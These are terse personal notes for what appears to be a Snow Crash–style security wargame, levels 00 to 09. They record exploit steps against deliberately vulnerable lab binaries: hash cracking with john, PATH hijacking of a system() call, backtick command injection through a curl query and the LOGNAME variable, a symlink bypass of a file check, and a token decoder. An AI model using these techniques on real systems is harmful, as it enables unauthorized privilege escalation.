# snow_cash

## level00

- cloudshark
- john
- dcode.fr 

## level01 

`flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash`

`docker run -it kalilinux/kali-rolling'`
`john test.txt --show`

## level02 

`chmod +r`

`scp -P 4242 level02@localhost:/home/user/level02/level02.pcap  /home/sgroinfr/kali_c/shared` 

`tshark -r level02.pcap -q -z follow,tcp,ascii,0`

## level03 

`strace ./level03 | grep Exploit`
[pid 2599] system("/usr/bin/env echo Exploit me"

>The program is using system() to execute a command that uses /usr/bin/env to run echo. This is a potential vulnerability because it's using the PATH environment variable to find the echo command.

```
cd /tmp
echo '#!/bin/bash' > echo
echo 'getflag' >> echo
chmod +x echo
```
`export PATH=/tmp:$PATH`

`./level03`

## level04 

>we try differet stuff
```
curl localhost:4747/?x="\`/bin/getflag\`"
```

## level05 
`vim /opt/openarenaserver/getflag.sh`
```
#!/bin/bash
/bin/getflag > /tmp/flag05
```
## level 6

`echo '[x ${`getflag`}]' > /tmp/flag06`
`./level06 /tmp/flag06`


## level07 

`strings ./level07` 
LOGNAME
/bin/echo %s 
;*2$" what is that  
```
export LOGNAME="\`getflag\`"
```

## level08 

%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"


`ln -s $(realpath token) /tmp/symlink`
`./level08 /tmp/symlink`

## level09

UWVS
You should not reverse this
LD_PRELOAD
Injection Linked lib detected exit..
/etc/ld.so.preload

creat scripte in tmp 

```
#!/usr/bin/python
import sys
```

>Read the token file content
content = open("/home/user/level09/token").readline()

>Iterate over the characters in the content

```
for i, c in enumerate(content):
    try:
        # Manipulate and print the character based on the loop index
        sys.stdout.write(chr(ord(c) - i))
    except Exception as e:
        # Handle specific exceptions if necessary
        pass
```
>Print a newline at the end: print()